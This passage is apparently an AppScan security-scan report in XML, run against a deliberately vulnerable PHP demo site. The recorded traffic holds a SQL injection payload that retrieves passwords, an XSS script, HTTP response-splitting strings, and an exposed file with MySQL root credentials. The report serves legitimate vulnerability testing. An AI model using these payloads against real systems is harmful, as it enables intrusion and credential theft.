		&lt;title&gt;SQL Injection Test&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; User Search &lt;/h2&gt;
	Possible payloads (in progress) :
	&lt;ul&gt;
		&lt;li&gt;Jimmy"; SELECT id, password as name FROM users where name = "Jimmy&lt;/li&gt;
		&lt;li&gt;John"; SELECT id, password as name FROM users where name = "John&lt;/li&gt;
	&lt;/ul&gt;
	&lt;form action="SQLI2.php" method="post"&gt;
		Name: &lt;input type="text" name="username" /&gt;
		&lt;input type="submit" /&gt;
	&lt;/form&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/SQLI.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 608
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
SQL Injection test page
This page's intended use is to show unauthorized password retrieval using SQL Injection.
This is the submission form.
--&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;SQL Injection Test&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; User Search &lt;/h2&gt;
	Possible payloads (in progress) :
	&lt;ul&gt;
		&lt;li&gt;Jimmy"; SELECT id, password as name FROM users where name = "Jimmy&lt;/li&gt;
		&lt;li&gt;John"; SELECT id, password as name FROM users where name = "John&lt;/li&gt;
	&lt;/ul&gt;
	&lt;form action="SQLI2.php" method="post"&gt;
		Name: &lt;input type="text" name="username" /&gt;
		&lt;input type="submit" /&gt;
	&lt;/form&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attSensitiveInHtmlComments" Noise="False">
        <Url>http://tftarget/demo/XSS-reflected.php</Url>
        <Entity />
        <Variant ID="13345">
          <Comments />
          <Difference>No test request</Difference>
          <Reasoning>AppScan discovered HTML comments containing what appears to be sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="480" Length="8" String="username" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/XSS-reflected.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/XSS.php


HTTP/1.1 200 OK
Content-Length: 489
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST --&gt;
&lt;!-- The goal is to be able to pop up an alert through script tags injected into the username field. --&gt;

&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;XSS Test - Reflected&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;h2&gt; Reflected XSS &lt;/h2&gt;
 A simple &amp;#60;script&amp;#62;alert('XSS')&amp;#60;/script&amp;#62; will work, along with any other JavaScript.
 &lt;form action="XSS-reflected2.php" method="post"&gt;
  Name: &lt;input type="text" name="username" /&gt;
  &lt;input type="submit" /&gt;
 &lt;/form&gt;

 
 &lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/XSS-reflected.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/XSS.php


HTTP/1.1 200 OK
Content-Length: 489
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST --&gt;
&lt;!-- The goal is to be able to pop up an alert through script tags injected into the username field. --&gt;

&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;XSS Test - Reflected&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;h2&gt; Reflected XSS &lt;/h2&gt;
 A simple &amp;#60;script&amp;#62;alert('XSS')&amp;#60;/script&amp;#62; will work, along with any other JavaScript.
 &lt;form action="XSS-reflected2.php" method="post"&gt;
  Name: &lt;input type="text" name="username" /&gt;
  &lt;input type="submit" /&gt;
 &lt;/form&gt;

 
 &lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attSensitiveInHtmlComments" Noise="False">
        <Url>http://tftarget/demo/XSS-reflected2.php</Url>
        <Entity />
        <Variant ID="13346">
          <Comments />
          <Difference>No test request</Difference>
          <Reasoning>AppScan discovered HTML comments containing what appears to be sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="469" Length="10" String=" XSS2.php " />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="GD_InternalIP" Noise="False">
        <Url>http://tftarget/demo/PredictableResource.php</Url>
        <Entity />
        <Variant ID="13347">
          <Comments />
          <Difference />
          <Reasoning>AppScan discovered what looks like an internal IP address in the response.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="666" Length="12" String="192.168.1.30" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/PredictableResource.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 375
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Predictable Resource
     This file tells you where the (hopefully) poorly hidden files are. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Predictable Resource Location&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Predictable Resource Location &lt;/h2&gt;

	&lt;ul&gt;
		&lt;li&gt;There is a backup of this file at http://192.168.1.30:8080/demo/PredictableResource.php.bak&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/PredictableResource.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 375
Date: Mon, 14 Jul 2014 14:48:41 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Predictable Resource
     This file tells you where the (hopefully) poorly hidden files are. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Predictable Resource Location&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Predictable Resource Location &lt;/h2&gt;

	&lt;ul&gt;
		&lt;li&gt;There is a backup of this file at http://192.168.1.30:8080/demo/PredictableResource.php.bak&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="GD_PathDisclosure" Noise="False">
        <Url>http://tftarget/demo/PathTraversal.php</Url>
        <Entity />
        <Variant ID="13348">
          <Comments />
          <Difference />
          <Reasoning>The response contains the absolute paths and/or filenames of files on the server.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="439" Length="4" String=" C:\" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/PathTraversal.php?action=PathTraversal.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 147
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html


Parse error: syntax error, unexpected ';' in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\PathTraversal.php on line 10
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/PathTraversal.php?action=PathTraversal.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 147
Date: Mon, 14 Jul 2014 14:48:41 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html


Parse error: syntax error, unexpected ';' in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\PathTraversal.php on line 10
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="GD_DirListing" Noise="False">
        <Url>http://tftarget/demo/DirectoryIndexing/</Url>
        <Entity />
        <Variant ID="13349">
          <Comments />
          <Difference />
          <Reasoning>The response contains the content of a directory (directory listing). This indicates that the server allows the listing of directories, which is not usually recommended.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="439" Length="10" String="Index of /" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/DirectoryIndexing/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 297
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DirectoryIndexing&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DirectoryIndexing&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/DirectoryIndexing/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 297
Date: Mon, 14 Jul 2014 14:48:41 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DirectoryIndexing&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DirectoryIndexing&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="GD_PathDisclosure" Noise="False">
        <Url>http://tftarget/demo/XSS-cookie.php</Url>
        <Entity />
        <Variant ID="13350">
          <Comments />
          <Difference />
          <Reasoning>The response contains the absolute paths and/or filenames of files on the server.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="772" Length="4" String=" C:\" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/XSS-cookie.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/XSS.php


HTTP/1.1 200 OK
Content-Length: 923
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
Response Splitting
Injecting a newline into a cookie allows you to return any http response you want.
This page exhibits this vulnerability.

value2;%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20302%20Moved%20Temporarily%0d%0aContent-Type:%20text/html%0d%0aContent-Length%2026%0d%0a%0d%0a&lt;html&gt;&lt;h2&gt;DONE&lt;/h2&gt;&lt;/html&gt;
302%20Moved%20Temporarily
--&gt;


Notice: Undefined index: username in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XSS-cookie.php on line 11

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Response Splitting&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;h2&gt; Response Splitting &lt;/h2&gt;
		The cookie's value is 
Notice: Undefined index: vuln in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XSS-cookie.php on line 26
		&lt;form action="ResponseSplitting.php" method="post"&gt;
			Name: &lt;input type="text" name="username" /&gt;
			&lt;input type="submit" /&gt;
		&lt;/form&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/XSS-cookie.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/XSS.php


HTTP/1.1 200 OK
Content-Length: 923
Date: Mon, 14 Jul 2014 14:48:41 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
Response Splitting
Injecting a newline into a cookie allows you to return any http response you want.
This page exhibits this vulnerability.

value2;%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20302%20Moved%20Temporarily%0d%0aContent-Type:%20text/html%0d%0aContent-Length%2026%0d%0a%0d%0a&lt;html&gt;&lt;h2&gt;DONE&lt;/h2&gt;&lt;/html&gt;
302%20Moved%20Temporarily
--&gt;


Notice: Undefined index: username in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XSS-cookie.php on line 11

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Response Splitting&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;h2&gt; Response Splitting &lt;/h2&gt;
		The cookie's value is 
Notice: Undefined index: vuln in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XSS-cookie.php on line 26
		&lt;form action="ResponseSplitting.php" method="post"&gt;
			Name: &lt;input type="text" name="username" /&gt;
			&lt;input type="submit" /&gt;
		&lt;/form&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="DirectAccesstoAdministrationPages" Noise="False">
        <Url>http://tftarget/demo/DIRECT~1/</Url>
        <Entity />
        <Variant ID="13419">
          <Comments />
          <Difference>path: path /demo/DIRECT~1/ -&gt; /demo/DIRECT~1/admin.txt</Difference>
          <Reasoning>AppScan requested a file which is probably not a legitimate part of the application. The response status was 200 OK. This indicates that the test  succeeded in retrieving the content of the requested file.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="160" Length="3" String="200" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/DIRECT~1/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 279
Date: Mon, 14 Jul 2014 14:49:23 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DIRECT~1&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DIRECT~1&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/DIRECT~1/admin.txt HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 226
Date: Mon, 14 Jul 2014 14:49:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Wed, 01 Jun 2011 19:59:54 GMT
ETag: "1000000023445-e2-4a4abf6cf8280"
Accept-Ranges: bytes
Connection: close
Content-Type: text/plain

admin.txt

MySQL config
username: root
password: root

var;%20%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2031%0D%0A&lt;html&gt;Hacked%20by%20yehg.org&lt;/html&gt;

</TestHttpTraffic>
        </Variant>
      </Issue>
    </Issues>
  </Results>
  <ApplicationData>
    <Cookies>
      <Total>0</Total>
    </Cookies>
    <JavaScripts>
      <Total>1</Total>
      <JavaScript>
        <Text>alert('XSS')</Text>
        <Url>http://tftarget/demo/XSS-stored.php</Url>
      </JavaScript>
    </JavaScripts>
    <Comments>
      <Total>30</Total>
      <Comment>
        <Text> XSS TEST - STORED </Text>
        <Url>http://tftarget/demo/</Url>
      </Comment>
      <Comment>
        <Text> The goal is to pull the payload from the database. After that we'll see. </Text>
        <Url>http://tftarget/demo/</Url>
      </Comment>
      <Comment>
        <Text> XSS  </Text>
        <Url>http://tftarget/demo/XSS.php</Url>
      </Comment>
      <Comment>
        <Text> This page just links to the two XSS pages. </Text>
        <Url>http://tftarget/demo/XSS.php</Url>
      </Comment>
      <Comment>
        <Text>
SQL Injection test page
This page's intended use is to show unauthorized password retrieval using SQL Injection.
This is the submission form.
</Text>
        <Url>http://tftarget/demo/SQLI.php</Url>
      </Comment>
      <Comment>
        <Text> Predictable Resource
     This file tells you where the (hopefully) poorly hidden files are. </Text>
        <Url>http://tftarget/demo/PredictableResource.php</Url>
      </Comment>
      <Comment>
        <Text> XPath Injection  </Text>
        <Url>http://tftarget/demo/XPathInjection.php</Url>
      </Comment>
      <Comment>
        <Text> This page demonstrates an XPath Injection vulnerability. </Text>
        <Url>http://tftarget/demo/XPathInjection.php</Url>
      </Comment>
      <Comment>
        <Text> LDAP Injection  </Text>
        <Url>http://tftarget/demo/LDAPInjection.php</Url>
      </Comment>
      <Comment>
        <Text> This page demonstrates an LDAP Injection vulnerability. </Text>
        <Url>http://tftarget/demo/LDAPInjection.php</Url>
      </Comment>
      <Comment>
        <Text> Format String Injection  </Text>
        <Url>http://tftarget/demo/FormatString.php</Url>
      </Comment>
      <Comment>
        <Text> This page demonstrates an Format String Injection vulnerability. </Text>
        <Url>http://tftarget/demo/FormatString.php</Url>
      </Comment>
      <Comment>
        <Text> OS Command Injection  </Text>
        <Url>http://tftarget/demo/OSCommandInjection.php</Url>
      </Comment>
      <Comment>
        <Text> This page demonstrates an OS Command Injection vulnerability. </Text>
        <Url>http://tftarget/demo/OSCommandInjection.php</Url>
      </Comment>
      <Comment>
        <Text> Eval Injection  </Text>
        <Url>http://tftarget/demo/EvalInjection.php</Url>
      </Comment>
      <Comment>
        <Text> This page demonstrates an Eval Injection vulnerability. </Text>
        <Url>http://tftarget/demo/EvalInjection.php</Url>
      </Comment>
      <Comment>
        <Text> LDAP Injection 2  </Text>
        <Url>http://tftarget/demo/LDAPInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> This page realizes an LDAP Injection vulnerability. </Text>
        <Url>http://tftarget/demo/LDAPInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> XPath Injection 2  </Text>
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> This page realizes an XPath Injection vulnerability. </Text>
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> String Format Injection 2  </Text>
        <Url>http://tftarget/demo/FormatString2.php</Url>
      </Comment>
      <Comment>
        <Text> This page realizes an String Format Injection vulnerability. </Text>
        <Url>http://tftarget/demo/FormatString2.php</Url>
      </Comment>
      <Comment>
        <Text> OS Command Injection 2  </Text>
        <Url>http://tftarget/demo/OSCommandInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> This page realizes an OS Command Injection vulnerability. </Text>
        <Url>http://tftarget/demo/OSCommandInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> Eval Injection 2  </Text>
        <Url>http://tftarget/demo/EvalInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> This page realizes an Eval Injection vulnerability. </Text>
        <Url>http://tftarget/demo/EvalInjection2.php</Url>
      </Comment>
      <Comment>
        <Text> XSS TEST </Text>
        <Url>http://tftarget/demo/XSS-reflected.php</Url>
      </Comment>
      <Comment>
        <Text> The goal is to be able to pop up an alert through script tags injected into the username field. </Text>
        <Url>http://tftarget/demo/XSS-reflected.php</Url>
      </Comment>
      <Comment>
        <Text>
Response Splitting
Injecting a newline into a cookie allows you to return any http response you want.
This page exhibits this vulnerability.

value2;%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20302%20Moved%20Temporarily%0d%0aContent-Type:%20text/html%0d%0aContent-Length%2026%0d%0a%0d%0a&lt;html&gt;&lt;h2&gt;DONE&lt;/h2&gt;&lt;/html&gt;
302%20Moved%20Temporarily
</Text>
        <Url>http://tftarget/demo/XSS-cookie.php</Url>
      </Comment>
      <Comment>
        <Text> XSS2.php - Reflected
     This file accepts the payload from XSS.php. </Text>
        <Url>http://tftarget/demo/XSS-reflected2.php</Url>
      </Comment>
    </Comments>
    <ScriptParameters>
      <Total>10</Total>
      <ScriptParameter>
        <Name>action</Name>
        <Values>
          <Value>PathTraversal.php</Value>
        </Values>
        <Url>http://tftarget/demo/PathTraversal.php</Url>
        <Type>Simple Link</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>username</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/SQLI2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>username</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/LDAPInjection2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>password</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/LDAPInjection2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>username</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>password</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>name</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/FormatString2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>fileName</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/OSCommandInjection2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>command</Name>
        <Values>
          <Value>1234</Value>
        </Values>
        <Url>http://tftarget/demo/EvalInjection2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
      <ScriptParameter>
        <Name>username</Name>
        <Values>
          <Value />
        </Values>
        <Url>http://tftarget/demo/XSS-reflected2.php</Url>
        <Type>Text</Type>
      </ScriptParameter>
    </ScriptParameters>
    <VisitedLinks>
      <Total>24</Total>
      <VisitedLink>
        <Url>http://tftarget/demo/</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/XSS.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/SQLI.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/PredictableResource.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/PathTraversal.php?action=PathTraversal.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/DirectoryIndexing/</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/XPathInjection.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/LDAPInjection.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/FormatString.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/OSCommandInjection.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/EvalInjection.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/SQLI2.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/DirectoryIndexing/admin.txt</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/LDAPInjection2.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/FormatString2.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/OSCommandInjection2.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/EvalInjection2.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/XSS-reflected.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/XSS-stored.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/XSS-cookie.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/XSS-reflected2.php</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/DIRECT~1/</Url>
      </VisitedLink>
      <VisitedLink>
        <Url>http://tftarget/demo/DIRECT~1/admin.txt</Url>
      </VisitedLink>
    </VisitedLinks>
    <BrokenLinks>
      <Total>1</Total>
      <BrokenLink>
        <Reason>Response Status 404 - Not Found</Reason>
        <Url>http://tftarget/demo/ResponseSplitting.php</Url>
      </BrokenLink>
    </BrokenLinks>
    <FilteredLinks>
      <Total>0</Total>
    </FilteredLinks>
  </ApplicationData>
</XmlReport>